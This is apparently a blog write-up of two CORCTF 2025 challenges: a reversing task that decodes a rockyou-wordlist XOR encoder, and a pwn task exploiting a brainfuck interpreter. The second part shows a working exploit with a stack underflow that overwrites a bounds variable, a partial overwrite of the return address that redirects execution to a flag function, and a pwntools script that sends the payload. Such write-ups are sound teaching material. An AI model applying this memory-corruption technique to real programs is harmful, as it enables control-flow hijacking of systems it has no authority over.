#import "./html_elements.typ": post

#show: post

// +++
// title = 'CORCTF 2025'
// date = 2025-09-11T16:07:27-03:00
// draft = false
// tags = ["rev", "pwn", "ctf"]
// +++


= yourock (rev) - 124 solves / 119 pts


// #box()[#html.frame()[#text(size: 8em, fill: rgb("#74c7ec").darken(10%))[B]]]

#box()[
  #html.elem("div", attrs: (class: "float-left mr-2"))[
    #html.frame()[ #text(size: 8em, fill: rgb("#74c7ec").darken(10%))[B]]
  ]
]

elow is the full code of the main function after some manual reversing. The challenge is basically an input encoder that encodes each character to a word based on a big dictionary (rockyou.txt password wordlist in this case).

```cpp

__int64 __fastcall main(int a1, char **argv, char **a3)
{
  __int64 v3; // rax
  __int64 v4; // rax
  unsigned int v5; // ebx
  __int64 str; // rax
  unsigned __int8 key; // [rsp+1Fh] [rbp-E1h]
  __int64 encoded_vec_begin; // [rsp+20h] [rbp-E0h] BYREF
  _QWORD encoded_vec_end[2]; // [rsp+28h] [rbp-D8h] BYREF
  __int64 iter; // [rsp+38h] [rbp-C8h]
  _BYTE vec[32]; // [rsp+40h] [rbp-C0h] BYREF
  _BYTE encoded_indexes[32]; // [rsp+60h] [rbp-A0h] BYREF
  _BYTE map[64]; // [rsp+80h] [rbp-80h] BYREF
  _BYTE argv_1[40]; // [rsp+C0h] [rbp-40h] BYREF
  unsigned __int64 v16; // [rsp+E8h] [rbp-18h]

  v16 = __readfsqword(0x28u);
  if ( a1 > 1 )
  {
    std::allocator<char>::allocator(map, argv, a3);
    std::string::basic_string<std::allocator<char>>(argv_1, argv[1], map);
    std::allocator<char>::~allocator(map);
    std::vector<std::string>::vector(vec);
    std::unordered_map<std::string,unsigned long>::unordered_map(map);
    if ( (unsigned __int8)load_file((__int64)vec, (__int64)map) != 1 )
    {
      v5 = 1;
    }
    else if ( (unsigned __int64)std::vector<std::string>::size(vec) > 0xFF )
    {
      key = generate_key(0);
      encode((__int64)encoded_indexes, (__int64)argv_1, (__int64)vec, key);
      std::operator<<<std::char_traits<char>>(&std::cout, "Encoded output:\n");
      encoded_vec_end[1] = encoded_indexes;
      encoded_vec_begin = std::vector<std::string>::begin(encoded_indexes);
      encoded_vec_end[0] = std::vector<std::string>::end(encoded_indexes);
      while ( (unsigned __int8)__gnu_cxx::operator!=<std::string *,std::vector<std::string>>(
                                 &encoded_vec_begin,
                                 encoded_vec_end) )
      {
        iter = __gnu_cxx::__normal_iterator<std::string *,std::vector<std::string>>::operator*(&encoded_vec_begin);
        str = std::operator<<<char>(&std::cout, iter);
        std::operator<<<std::char_traits<char>>(str, " ");
        __gnu_cxx::__normal_iterator<std::string *,std::vector<std::string>>::operator++(&encoded_vec_begin);
      }
      std::operator<<<std::char_traits<char>>(&std::cout, "\n");
      v5 = 0;
      std::vector<std::string>::~vector(encoded_indexes);
    }
    else
    {
      std::operator<<<std::char_traits<char>>(&std::cerr, "Wordlist too small.\n");
      v5 = 1;
    }
    std::unordered_map<std::string,unsigned long>::~unordered_map(map);
    std::vector<std::string>::~vector(vec);
    std::string::~string(argv_1);
  }
  else
  {
    v3 = std::operator<<<std::char_traits<char>>(&std::cerr, "Usage: ");
    v4 = std::operator<<<std::char_traits<char>>(v3, *argv);
    std::operator<<<std::char_traits<char>>(v4, " \"your message\"\n");
    return 1;
  }
  return v5;
}
```

It takes the input, and maps each character to a line on the `rockyou.txt` file, below is the most important function in the challenge

```cpp
__int64 __fastcall encode(__int64 words, __int64 argv, __int64 vec, unsigned __int8 key)
{
  __int64 key_idx; // rax
  __int64 word; // rax
  unsigned __int8 idx; // [rsp+27h] [rbp-19h]
  unsigned __int64 i; // [rsp+28h] [rbp-18h]

  std::vector<std::string>::vector(words);
  key_idx = std::vector<std::string>::operator[](vec, key);
  std::vector<std::string>::push_back(words, key_idx);
  for ( i = 0; i < std::string::size(argv); ++i )
  {
    idx = key ^ *(_BYTE *)std::string::operator[](argv, i);// acc = key ^ argv[i]
    if ( idx >= (unsigned __int64)std::vector<std::string>::size(vec) )
      exit(1);
    word = std::vector<std::string>::operator[](vec, idx);// password = vec[acc]
    std::vector<std::string>::push_back(words, word);
    key ^= i ^ idx;
  }
  return words;
}
```

Note that the encoded word itself is irrelevant, since the semantic meaning of the encoding is the index of the word on the wordlist. Note that the seed is directly encoded on the payload as the first word, so if we send 1 character, the encoded payload will have 2 words.

This seems pretty straightforward, so my methodology now was to create a small batch of tests to validate my solver script, and iteratively work on it until it decoded it all.

Solution:

```python
# ❯ ./encode "A"
# Encoded output:
# rebelde jesus1
# 183 248
# ===============
# ~> ./encode "B"
# Encoded output:
# flower richard
# 58 124
# ===============
# ~> ./encode "AAAA"
# Encoded output:
# carlos thomas 123456 12345 123456789
# 44 107 1 2 3

# enc = [43,106,0,1,2] # AAAA
enc = [63, 92, 12, 28, 19, 20, 22, 24, 15, 69, 91, 1, 24, 66, 73, 39, 98, 82, 29, 66, 70, 70, 75, 28, 46, 58, 90, 74, 18, 3, 18]
# enc = [57, 123] # B

print(enc[1:])

key = enc[0]
for (i, idx) in enumerate(enc[1:]):
    flag = key ^ idx
    print(chr(flag), end='')

    key = key ^ idx ^ i
```

= frog (pwn) - 40 solves / 153 pts

This challenge was quite a fun one.

The binary we're given is a brainfuck interpreter, we need to find a bug in it and exploit it to print the flag.

One thing that is very convenient is that we have a function to print the flag on the main segment of the executable

```c
int mmio_dump_flag()
{
  char v1; // [rsp+7h] [rbp-9h]
  FILE *stream; // [rsp+8h] [rbp-8h]

  puts("mmio procedure invoked");
  stream = fopen("flag.txt", "r");
  if ( !stream )
    return puts("flag.txt not found");
  while ( 1 )
  {
    v1 = fgetc(stream);
    if ( v1 == -1 )
      break;
    putchar(v1);
  }
  return fclose(stream);
}
```

This means that we can solve the chal by achieving a control flow redirection to it, maybe even just by subtracting something from a byte from a pointer stored on the stackt that points to somewhere on the same segment.

This is the main execution loop of the vm:


```c
  __int64 __fastcall interpret_program(__int64 a1)
{
  char v2; // [rsp+1Dh] [rbp-143h]
  char v3; // [rsp+1Eh] [rbp-142h]
  char v4; // [rsp+1Fh] [rbp-141h]
  int v5; // [rsp+20h] [rbp-140h]
  int v6; // [rsp+24h] [rbp-13Ch]
  __int64 v7; // [rsp+28h] [rbp-138h]
  __int64 v8; // [rsp+30h] [rbp-130h]
  unsigned __int64 i; // [rsp+38h] [rbp-128h]
  char *idx_a; // [rsp+40h] [rbp-120h]
  char *idx_b; // [rsp+48h] [rbp-118h]
  _QWORD v12[34]; // [rsp+50h] [rbp-110h] BYREF

  v12[33] = __readfsqword(0x28u);
  qmemcpy(v12, &unk_2300, 0x108u);
  v7 = 0;
  v8 = 0;
  while ( 1 )
  {
    do
    {
      while ( 1 )
      {
        do
        {
          while ( 1 )
          {
            do
            {
              while ( 1 )
              {
                do
                {
                  while ( 1 )
                  {
                    do
                    {
                      while ( 1 )
                      {
                        v2 = *(_BYTE *)(a1 + v7);
                        idx_a = (char *)&v12[1] + v8;
                        idx_b = (char *)v12 + v12[0] + 7;
                        if ( v2 != 93 )
                          break;
                        if ( *((_BYTE *)&v12[1] + v8) )
                        {
                          v6 = 1;
                          while ( v6 > 0 )
                          {
                            if ( !v7 )
                            {
                              puts("No matching '[' found in code");
                              return 1;
                            }
                            --v7;
                            v3 = *(_BYTE *)(a1 + v7);
                            if ( v3 == 91 )
                              --v6;
                            if ( v3 == 93 )
                              ++v6;
                          }
                        }
                        ++v7;
                      }
                    }
                    while ( v2 > 93 );
                    if ( v2 != 91 )
                      break;
                    if ( !*((_BYTE *)&v12[1] + v8) )
                    {
                      v5 = 1;
                      while ( v5 > 0 )
                      {
                        if ( (unsigned __int64)++v7 > 0x59 )
                        {
                          puts("No matching ']' found in code");
                          return 1;
                        }
                        v4 = *(_BYTE *)(a1 + v7);
                        if ( v4 == 91 )
                          ++v5;
                        if ( v4 == 93 )
                          --v5;
                      }
                    }
                    ++v7;
                  }
                }
                while ( v2 > 91 );
                if ( v2 != 62 )
                  break;
                ++v8;
                ++v7;
              }
            }
            while ( v2 > 62 );
            if ( v2 != 60 )
              break;
            --v8;
            ++v7;
          }
        }
        while ( v2 > 60 );
        if ( v2 != 45 )
          break;
        if ( idx_b < idx_a )
        {
LABEL_18:
          puts("Out of bounds data access");
          return 1;
        }
        --*idx_a;
        ++v7;
      }
    }
    while ( v2 > 45 );
    if ( v2 == 35 )
      break;
    if ( v2 == 43 )
    {
      if ( idx_b < idx_a )
        goto LABEL_18;
      ++*idx_a;
      if ( ++v7 == 431136 )
        mmio_dump_flag();
    }
  }
  puts("Program halted!");
  puts("Data memory:");
  for ( i = 0; i <= 0xFF; ++i )
    printf("[0x%02hhX] ", *((unsigned __int8 *)&v12[1] + i));
  putchar(10);
  printf("data pointer: %zu\n", v8);
  return 0;
}
```

My initial approach on this one was a dynamic analysis to understand which bound checks there are, we can make a simple test like this:

- `+[<+]`
  - It will keep moving the vm IP to the left (subtracting).
  - Assuming there isn't a 255 on the way that will overflow to 0;

And the same to the right:
- `+[>+]`


Executing this we see that increasing the IP, the vm notices that and stops, but by decreasing the IP it just crashes the vm, thus we have a buffer underflow.

This is not immediately useful, since the return addresses that are from function calls that will be returned to after this one (lower stack frames), are down the stack, but our stack grows in the opposite direction (this might sound crazy, this is crazy, and I'm not making this up), so, the addressess that we want are:

- lower on the stack
- thus, have higher addressess (our stack grows upside down...)
- and we have an underflow
- so... we can't directly use it to solve the chal

We need to use the underflow to grant more exploitation primitives. This is where a bit of reversing comes in, see the bounds check:

```c

   0x555555555681 <interpret_program+417>:      mov    rax,QWORD PTR [rbp-0x120]
   0x555555555688 <interpret_program+424>:      cmp    QWORD PTR [rbp-0x118],rax
=> 0x55555555568f <interpret_program+431>:      jae    0x5555555556aa <interpret_program+458>
```

One of those stores the maximum address for the brainfuck vm's tape, and the other one is the current IP (or tape address if you want to call it that way, etc...). The good news there is that those variables are stored on the stack, as you can see my the instructions loading from specific offsets from the stack base, AND they can be ovewriten by our underflow.

So, the idea is to use the underflow to increase the maximum address, then make an overflow and change the return address on the stack so that we land on the function to print the flag when the current function returns.

So breaking this down:

- Moving to the left to increase the maximum bound by ovewriting the variable on the stack

```elixir
+<+<+<+
```

- Then moving back to the right to start our journey down the stack (by going up...)

```elixir
>>>-
```

- Then we run this algorithm to find the first `nonzero` byte, since there's a lot of empty space down the stack (it's the vm's tape).

```elixir
+[>[<-]<[->+<]>]
```

- Then we move the IP to point to the cell right before the byte we want to modify

```elixir
>>>>>>>>>>>>>>>
```

At this point, this will be the tape:

```
                  we are here
                      |
                      v
10 d2 ff ff ff 7f 00 00 35 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
```

We are right next to the return address, I'll highlight it


```
                  we are here
                      |    return address here
                      v /-----------------------\
10 d2 ff ff ff 7f 00 00 |35 54 55 55 55 55 00 00| 00 00 00 00 00 00 00 00
```

Since it's little endian, it's not `35 54 55 55 55 55 00 00`, it's actually `0000555555555435`

Our objective is to increase that single byte from `0x35` to `0x66`, to that the return address points to the flag function

```
                  we are here
                      |
                      v
10 d2 ff ff ff 7f 00 00 35 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
                         |
                         | just increase a little from 0x35 to 0x66
                         |
                         v
10 d2 ff ff ff 7f 00 00 66 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00

```

That's `49` in decimal.

- Since it's just `7*7` (that's a cool number), we can compute `49` as `7*7` in brainfuck, which is the last part of the exploit


```elixir
+++++++[>+++++++<-]
```

Putting it all together


`
`
Putting it all together


```python

from pwn import *


p = '+<+<+<+>>>-+[>[<-]<[->+<]>]>>>>>>>>>>>>>>>+++++++[>+++++++<-]#'

io = remote('ctfi.ng', 31415)
io.sendline(p.encode())
io.interactive()

```
